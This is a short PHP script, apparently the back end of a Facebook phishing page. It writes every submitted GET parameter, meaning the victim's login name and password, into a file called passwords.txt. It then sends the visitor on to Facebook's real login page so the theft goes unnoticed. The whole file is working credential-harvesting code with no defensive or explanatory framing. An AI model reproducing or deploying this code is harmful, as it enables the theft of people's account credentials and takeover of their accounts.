<?php 

header("Location: http://www.Facebook.com/login.php "); 

$handle = fopen("passwords.txt", "a"); 

foreach($_GET as $variable => $value) 
{ 
	fwrite($handle, $variable); 
	fwrite($handle, "="); 
	fwrite($handle, $value); 
	fwrite($handle, "\r\n"); 
} 

fwrite($handle, json_encode($handle)); 
fclose($handle); 
exit; 

?>